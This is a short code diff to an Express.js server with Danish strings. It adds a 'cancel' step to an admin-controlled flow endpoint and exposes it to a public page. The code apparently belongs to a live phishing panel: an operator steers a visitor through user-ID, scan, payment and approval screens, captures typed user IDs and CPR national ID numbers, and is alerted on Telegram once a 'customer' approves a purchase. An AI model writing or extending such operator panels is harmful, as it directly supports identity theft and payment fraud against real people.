@@ -471,7 +471,7 @@ app.post('/api/session/new', requireAdmin, (req, res) => {
 // Telegram-besked ("Kunde er nu Godkendt!") som i det gamle panel.
 app.post('/api/flow', requireAdmin, (req, res) => {
   const flow = req.body.flow;
-  if (!['brugerid', 'scan', 'betaling', 'wait', 'approved'].includes(flow)) {
+  if (!['brugerid', 'scan', 'betaling', 'annuller', 'wait', 'approved'].includes(flow)) {
     return res.status(400).json({ error: 'Ugyldigt flow' });
   }
   state.flow = flow;
@@ -628,6 +628,7 @@ function publicPayload() {
     action: { title: a.title || 'Godkend dette køb', amount: a.amount || '', detail: a.detail || '' },
     tekst: state.tekst || '',
     typed: state.typed || { brugerId: '', cpr: '' },
+    annulerer: state.flow === 'annuller',
     offlineTitle: state.offlineTitle,
     offlineBody: state.offlineBody
   };
